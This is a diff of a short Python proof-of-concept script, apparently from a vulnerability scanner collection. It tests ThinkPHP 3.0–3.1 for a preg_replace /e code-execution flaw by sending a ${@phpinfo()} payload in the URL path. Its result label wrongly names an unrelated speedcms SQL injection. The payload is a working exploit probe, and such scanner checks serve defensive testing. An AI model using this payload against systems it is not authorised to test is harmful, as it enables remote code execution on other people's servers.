@@ -9,17 +9,10 @@ description: ThinkPHP 版本3.0~3.1开启Lite模式后preg_replace使用了/e选
 import sys
 import requests
 import warnings
-
-  
-
-class code_exec:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['speedcms list文件参数cid SQL注入','','']
         payload = "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -36,5 +29,4 @@ class code_exec:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = code_exec(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
